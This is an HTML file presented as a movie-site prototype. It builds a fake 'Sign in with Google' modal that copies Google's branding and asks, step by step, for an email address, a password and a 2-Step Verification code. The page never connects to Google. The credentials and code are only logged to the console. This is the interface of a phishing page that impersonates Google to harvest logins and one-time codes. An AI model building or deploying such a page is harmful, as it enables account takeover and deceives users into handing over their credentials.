<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Movie Website Prototype</title>
    <style>
        /* --- General Body Styles --- */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            background-color: #f0f2f5;
            color: #1c1e21;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }

        .main-content {
            padding: 20px;
        }
        
        h1 {
            color: #333;
        }

        /* --- Google Button Style --- */
        .google-login-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 12px 24px;
            border-radius: 4px;
            background-color: #4285F4;
            color: white;
            border: none;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            box-shadow: 0 2px 4px 0 rgba(0,0,0,0.25);
            transition: background-color .3s, box-shadow .3s;
        }

        .google-login-btn:hover {
            background-color: #3367D6;
            box-shadow: 0 4px 8px 0 rgba(0,0,0,0.25);
        }

        .google-login-btn svg {
            width: 20px;
            height: 20px;
            margin-right: 12px;
            background-color: white;
            border-radius: 50%;
            padding: 2px;
        }
        
        /* --- Modal Styles --- */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            display: none; /* Initially hidden */
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .google-modal {
            background-color: white;
            border-radius: 8px;
            padding: 24px;
            width: 90%;
            max-width: 450px;
            box-sizing: border-box;
            text-align: center;
            border: 1px solid #dadce0;
        }
        
        .google-modal-header img {
            width: 75px;
            height: 24px;
            margin-bottom: 8px;
        }

        .google-modal-header h2 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin: 0 0 8px 0;
        }
        
        .google-modal-header p {
            font-size: 16px;
            color: #202124;
            margin: 0;
        }
        
        .user-email-display {
            display: inline-flex;
            align-items: center;
            padding: 6px 12px;
            border: 1px solid #dadce0;
            border-radius: 100px;
            font-size: 14px;
            color: #3c4043;
            margin: 16px 0;
        }

        .input-group {
            position: relative;
            margin: 30px 0;
        }

        .input-field {
            width: 100%;
            padding: 16px 12px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        
        .input-field:focus {
            border-color: #1a73e8;
            outline: 2px solid transparent;
            box-shadow: 0 0 0 2px #d2e3fc;
        }

        .input-label {
            position: absolute;
            top: 16px;
            left: 13px;
            font-size: 16px;
            color: #80868b;
            pointer-events: none;
            transition: all 0.2s ease-in-out;
        }

        .input-field:focus + .input-label,
        .input-field:not(:placeholder-shown) + .input-label {
            top: -10px;
            left: 10px;
            font-size: 12px;
            color: #1a73e8;
            background-color: white;
            padding: 0 4px;
        }
        
        .modal-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
        }
        
        .create-account-link, .forgot-link {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            background: none;
            border: none;
            cursor: pointer;
            font-size: 14px;
        }
        
        .next-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <div class="main-content">
        <h1>My Awesome Movie Site</h1>
        <p>Login to continue and browse movies.</p>
        <button id="loginBtn" class="google-login-btn">
            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" xmlns:xlink="http://www.w3.org/1999/xlink" style="display: block;">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
                <path fill="none" d="M0 0h48v48H0z"></path>
            </svg>
            Login with Google
        </button>
    </div>

    <!-- Modal Overlay and Content -->
    <div id="modalOverlay" class="modal-overlay">
        <div class="google-modal">

            <!-- Step 1: Email -->
            <div id="emailStep">
                <div class="google-modal-header">
                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
                    <h2>Sign in</h2>
                    <p>Use your Google Account</p>
                </div>
                <div class="input-group">
                    <input type="email" id="emailInput" class="input-field" placeholder=" " required>
                    <label for="emailInput" class="input-label">Email or phone</label>
                </div>
                <a href="#" class="forgot-link">Forgot email?</a>
                <div class="modal-footer">
                    <a href="#" class="create-account-link">Create account</a>
                    <button id="nextEmailBtn" class="next-btn">Next</button>
                </div>
            </div>

            <!-- Step 2: Password -->
            <div id="passwordStep" class="hidden">
                <div class="google-modal-header">
                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
                    <h2>Welcome</h2>
                    <div class="user-email-display">
                        <span id="userEmail"></span>
                    </div>
                </div>
                <div class="input-group">
                    <input type="password" id="passwordInput" class="input-field" placeholder=" " required>
                    <label for="passwordInput" class="input-label">Enter your password</label>
                </div>
                <a href="#" class="forgot-link">Forgot password?</a>
                <div class="modal-footer">
                    <span></span> <!-- Spacer -->
                    <button id="nextPasswordBtn" class="next-btn">Next</button>
                </div>
            </div>

            <!-- Step 3: 2FA/OTP -->
            <div id="otpStep" class="hidden">
                <div class="google-modal-header">
                     <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
                    <h2>2-Step Verification</h2>
                    <p>This helps show that it's really you trying to sign in</p>
                </div>
                 <div class="input-group">
                    <input type="text" id="otpInput" class="input-field" placeholder=" " required maxlength="6" pattern="[0-9]*" inputmode="numeric">
                    <label for="otpInput" class="input-label">Enter the 6-digit code</label>
                </div>
                <a href="#" class="forgot-link">More ways to verify</a>
                 <div class="modal-footer">
                    <span></span> <!-- Spacer -->
                    <button id="nextOtpBtn" class="next-btn">Next</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // Modal elements
            const loginBtn = document.getElementById('loginBtn');
            const modalOverlay = document.getElementById('modalOverlay');
            const googleModal = document.querySelector('.google-modal');

            // Step elements
            const emailStep = document.getElementById('emailStep');
            const passwordStep = document.getElementById('passwordStep');
            const otpStep = document.getElementById('otpStep');

            // Button elements
            const nextEmailBtn = document.getElementById('nextEmailBtn');
            const nextPasswordBtn = document.getElementById('nextPasswordBtn');
            const nextOtpBtn = document.getElementById('nextOtpBtn');
            
            // Input elements
            const emailInput = document.getElementById('emailInput');
            const passwordInput = document.getElementById('passwordInput');
            const otpInput = document.getElementById('otpInput');
            
            // Data display
            const userEmailDisplay = document.getElementById('userEmail');

            // --- Event Listeners ---

            // Open the modal
            loginBtn.addEventListener('click', () => {
                modalOverlay.style.display = 'flex';
            });

            // Close the modal when clicking on the overlay
            modalOverlay.addEventListener('click', (event) => {
                if (event.target === modalOverlay) {
                    closeModal();
                }
            });

            // Prevent closing when clicking inside the modal
            googleModal.addEventListener('click', (event) => {
                event.stopPropagation();
            });

            // --- Modal Flow Logic ---

            // Email Step -> Password Step
            nextEmailBtn.addEventListener('click', (event) => {
                event.preventDefault(); // Prevent form submission
                if (emailInput.value.trim() !== '' && emailInput.checkValidity()) {
                    console.log('Email:', emailInput.value);
                    userEmailDisplay.textContent = emailInput.value;
                    
                    emailStep.classList.add('hidden');
                    passwordStep.classList.remove('hidden');
                } else {
                    alert('Please enter a valid email address.');
                }
            });
            
            // Password Step -> OTP Step
            nextPasswordBtn.addEventListener('click', (event) => {
                event.preventDefault();
                if (passwordInput.value.trim() !== '') {
                    console.log('Password:', passwordInput.value); // In a real app, NEVER log passwords
                    
                    passwordStep.classList.add('hidden');
                    otpStep.classList.remove('hidden');
                } else {
                    alert('Please enter your password.');
                }
            });

            // OTP Step -> Finish
            nextOtpBtn.addEventListener('click', (event) => {
                event.preventDefault();
                if (otpInput.value.trim().length === 6) {
                    console.log('OTP Code:', otpInput.value);
                    
                    alert('Login successful! (Prototype)');
                    closeModal();
                } else {
                    alert('Please enter a valid 6-digit code.');
                }
            });
            
            // --- Helper Functions ---
            
            function closeModal() {
                modalOverlay.style.display = 'none';
                resetModal();
            }
            
            function resetModal() {
                // Clear input fields
                emailInput.value = '';
                passwordInput.value = '';
                otpInput.value = '';
                
                // Reset to the first step
                emailStep.classList.remove('hidden');
                passwordStep.classList.add('hidden');
                otpStep.classList.add('hidden');
            }
        });
    </script>

</body>
</html>
